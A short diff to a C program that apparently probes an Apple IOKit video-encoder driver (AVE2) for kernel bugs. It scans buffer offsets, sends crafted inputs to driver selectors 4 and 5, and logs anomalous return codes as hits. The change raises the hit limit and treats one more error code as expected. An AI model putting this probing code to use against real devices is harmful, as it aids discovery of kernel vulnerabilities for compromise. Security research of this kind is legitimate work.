@@ -329,7 +329,7 @@ int main(void) {
         int lo = getenv("AVE2_SCAN_LO") ? (int)strtoul(getenv("AVE2_SCAN_LO"),0,0) : 0x28;
         int hi = getenv("AVE2_SCAN_HI") ? (int)strtoul(getenv("AVE2_SCAN_HI"),0,0) : 0x1a0a0;
         int hits = 0;
-        for (int o = lo; o + 0x18 <= hi && hits < 8; o += 4) {
+        for (int o = lo; o + 0x18 <= hi && hits < 40; o += 4) {
             if (create_session(1, &c) != 0) { printf("[-] create at o=0x%x\n", o); break; }
             fill_cfg(0, 1920, 1080, 2, 1, 0, 0);
             uint8_t d4[0x1a0a0]; memset(d4,0,sizeof(d4)); memcpy(d4,stat_in,0x1a0a0);
@@ -345,7 +345,7 @@ int main(void) {
             *(uint32_t *)(d5 + 0x28) = 1;
             uint8_t o5[0x150]; size_t o5z = 0x150; memset(o5, 0xAA, sizeof(o5));
             kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, d5, sizeof(d5), o5, &o5z);
-            if (k4 != 0 || k5 != 0xe0000001u) {
+            if (k4 != 0 || (k5 != 0xe0000001u && k5 != 0xe00002d9u)) {
                 printf("[HIT] o=0x%x sel4=0x%08x sel5=0x%08x\n", o, k4, k5);
                 hits++;
             }
